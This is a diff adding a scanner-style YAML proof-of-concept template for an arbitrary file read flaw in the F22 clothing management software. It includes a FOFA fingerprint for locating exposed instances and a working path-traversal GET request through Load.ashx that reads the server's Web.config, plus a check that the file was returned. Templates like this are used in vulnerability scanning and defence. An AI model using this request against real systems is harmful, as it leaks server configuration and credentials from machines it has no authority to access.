@@ -1,0 +1,22 @@
+id: poc-yaml-f22-load-ashx-anyfile-read
+info:
+  name: F22服装管理软件系统 Load.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: F22服装管理软件系统
+  fofa: body="(images/login_c05-05.gif)"
+requests:
+- method: GET
+  path: /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../Web.config
+  expression: 'status_code == 200 &&
+
+    contains(body,"<configuration>") &&
+
+    contains(body,"<system.web>") &&
+
+    contains(headers,"filename=Web.config")
+
+    '
+variables: {}
+transport: http
